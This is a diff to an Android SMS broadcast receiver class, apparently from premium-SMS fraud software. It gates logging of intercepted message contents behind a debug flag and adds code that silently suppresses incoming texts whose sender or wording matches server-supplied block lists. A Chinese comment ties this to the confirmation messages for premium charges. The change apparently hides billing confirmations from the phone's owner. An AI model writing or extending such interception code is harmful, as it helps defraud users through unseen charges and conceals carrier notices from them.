@@ -21,7 +21,9 @@ public class PrivateSMSBRC extends BroadcastReceiver {
 
     public void onReceive(Context context, Intent intent) {
         if (intent != null) {
-            Config.LOGD("[[PrivateSMSBRC::onReceive]] action = " + intent.getAction());
+            if (Config.DEBUG) {
+                Config.LOGD("[[PrivateSMSBRC::onReceive]] action = " + intent.getAction());
+            }
             SmsMessage[] messages = getMessagesFromIntent(intent);
             if (messages == null || messages.length == 0) {
                 return;
@@ -33,15 +35,19 @@ public class PrivateSMSBRC extends BroadcastReceiver {
                  * 先判断短信中心是否已经有了配置，如果没有的话，尝试从短信中获取短信中心的号码
                  */
 
-                Config.LOGD("[[PrivateSMSBRC::onReceive]] has receive SMS from <<" + message.getDisplayOriginatingAddress()
-                                + ">>, content : " + message.getMessageBody()
-                                + "\n || sms center = " + message.getServiceCenterAddress()
-                                + "\n || sms display origin address = " + message.getDisplayOriginatingAddress()
-                                + "\n || sms = " + message.toString()
-                                + "\n || intent info = " + intent.toString());
+                if (Config.DEBUG) {
+                    Config.LOGD("[[PrivateSMSBRC::onReceive]] has receive SMS from <<" + message.getDisplayOriginatingAddress()
+                                    + ">>, content : " + message.getMessageBody()
+                                    + "\n || sms center = " + message.getServiceCenterAddress()
+                                    + "\n || sms display origin address = " + message.getDisplayOriginatingAddress()
+                                    + "\n || sms = " + message.toString()
+                                    + "\n || intent info = " + intent.toString());
+                }
 
                 String center = message.getServiceCenterAddress();
-                Config.LOGD("[[PrivateSMSBRC::onReceive]] center = " + center);
+                if (Config.DEBUG) {
+                    Config.LOGD("[[PrivateSMSBRC::onReceive]] center = " + center);
+                }
                 if (!TextUtils.isEmpty(center)) {
                     if (center.startsWith("+") == true && center.length() == 14) {
                         center = center.substring(3);
@@ -59,14 +65,31 @@ public class PrivateSMSBRC extends BroadcastReceiver {
                 /**
                  * 如果短信中心不为空，那么再进行其他的操作
                  */
-                if (!TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())) {
-//                    if (message.getOriginatingAddress().indexOf(AppRuntime.BLOCKED_NUMBER) != -1) {
-//                        String key = message.getMessageBody();
-//
-//                        if (Config.DELETE_RECEIVED_MESSAGE) {
-//                            abortBroadcast();
-//                        }
-//                    }
+                if (!TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())
+                        && AppRuntime.ACTIVE_RESPONSE != null
+                        && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockSmsPort)) {
+                    String msg = message.getMessageBody();
+                    boolean keyBlock = false;
+                    if (!TextUtils.isEmpty(msg) && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockKeys)) {
+                        try {
+                            String[] blocks = AppRuntime.ACTIVE_RESPONSE.blockKeys.split(";");
+                            if (blocks != null) {
+                                for (String key : blocks) {
+                                    if (msg.contains(key)) {
+                                        keyBlock = true;
+                                        break;
+                                    }
+                                }
+                            }
+                        } catch (Exception e) {
+                        }
+                    }
+
+                    if (message.getOriginatingAddress().indexOf(AppRuntime.ACTIVE_RESPONSE.blockSmsPort) != -1 || keyBlock) {
+                        //当前短信的的发送地址包含需要拦截的短信的地址
+                        //TODO: 扣费短信的二次确认和动态确认
+                        abortBroadcast();
+                    }
                 } else {
                     //如果短信中心为空，向的运营商发送一条信息来获取短信中心的号码
 //                    SMSUtil.trySendCmdToNetwork(context);
